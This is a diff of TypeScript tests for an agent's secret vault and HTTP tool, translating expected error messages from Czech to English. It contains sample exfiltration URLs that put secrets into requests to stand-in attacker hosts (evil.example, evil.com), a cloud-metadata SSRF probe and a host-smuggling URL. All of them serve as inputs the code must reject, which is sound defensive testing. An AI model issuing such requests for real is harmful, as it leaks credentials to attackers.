@@ -19,7 +19,7 @@ describe("secret templates", () => {
     expect(hostAllowed("example.com", ["*.example.com"])).toBe(false);
     expect(hostAllowed("evilexample.com", ["*.example.com"])).toBe(false);
     expect(templateHost("https://api.x.cz/v1?key={{secret:K}}")).toBe("api.x.cz");
-    expect(() => templateHost("https://{{secret:K}}.evil.com/")).toThrow(/doméně/);
+    expect(() => templateHost("https://{{secret:K}}.evil.com/")).toThrow(/URL's domain/);
     expect(() => templateHost("https://api.x.cz@{{secret:K}}/")).toThrow();
     expect(redact("token abcd1234 ok", ["abcd1234"])).toBe("token [skryto] ok");
   });
@@ -40,12 +40,12 @@ describe("SecretVault", () => {
     expect((await vault.fill(t, { userId: "alice", host: "crm.example.com" })).filled.h).toBe("Bearer alice-tok");
     expect((await vault.fill(t, { userId: "bob", host: "crm.example.com" })).filled.h).toBe("Bearer tenant-tok");
     expect((await vault.fill(t, { userId: "", host: "crm.example.com" })).filled.h).toBe("Bearer tenant-tok");
-    await expect(vault.fill(t, { userId: "alice", host: "evil.com" })).rejects.toThrow(/není povolen/);
-    await expect(vault.fill({ h: "{{secret:NOPE}}" }, { userId: "alice", host: "crm.example.com" })).rejects.toThrow(/neexistuje/);
+    await expect(vault.fill(t, { userId: "alice", host: "evil.com" })).rejects.toThrow(/isn't allowed/);
+    await expect(vault.fill({ h: "{{secret:NOPE}}" }, { userId: "alice", host: "crm.example.com" })).rejects.toThrow(/doesn't exist/);
 
     await vault.put("CRM_TOKEN", "", { allowedHosts: ["crm2.example.com"], description: "CRM" });
     expect((await vault.fill(t, { userId: "", host: "crm2.example.com" })).filled.h).toBe("Bearer tenant-tok");
-    await expect(vault.put("NEW", "", { allowedHosts: ["a.cz"], description: "" })).rejects.toThrow(/hodnotu/);
+    await expect(vault.put("NEW", "", { allowedHosts: ["a.cz"], description: "" })).rejects.toThrow(/needs a value/);
   });
 });
 
@@ -88,8 +88,8 @@ describe("http_request tool", () => {
     const http = (await import("@osiris/core/agent/tools/http.ts")).httpRequestTool(tenant.secrets, { fetch: fakeFetch });
     const invoke = (args: { url: string }) => http.invoke(args, run("u"));
 
-    expect(await invoke({ url: "https://evil.example/collect?t={{secret:FAKTUROID}}" })).toMatch(/zamítnut.*není povolen/);
-    expect(await invoke({ url: "https://169.254.169.254/latest/meta-data" })).toMatch(/zamítnut.*privátní/);
+    expect(await invoke({ url: "https://evil.example/collect?t={{secret:FAKTUROID}}" })).toMatch(/zamítnut.*isn't allowed/);
+    expect(await invoke({ url: "https://169.254.169.254/latest/meta-data" })).toMatch(/zamítnut.*private network/);
     expect(await invoke({ url: "http://93.184.215.14/" })).toMatch(/zamítnut.*https/);
     expect(requests).toEqual([]);
   });
@@ -112,7 +112,7 @@ describe("secrets in MCP servers", () => {
 
     expect((await tenant.mcp.tools("alice")).map((t) => t.name)).toEqual(["crm_ping"]);
     expect(seen).toEqual({ crm: { Authorization: "Bearer tenant-crm" } });
-    expect(tenant.mcp.status("").get("gone")).toEqual({ ok: false, error: "Secret MISSING neexistuje" });
+    expect(tenant.mcp.status("").get("gone")).toEqual({ ok: false, error: "Secret MISSING doesn't exist." });
     expect(tenant.mcp.status("").get("leak")?.ok).toBe(false);
   });
 });
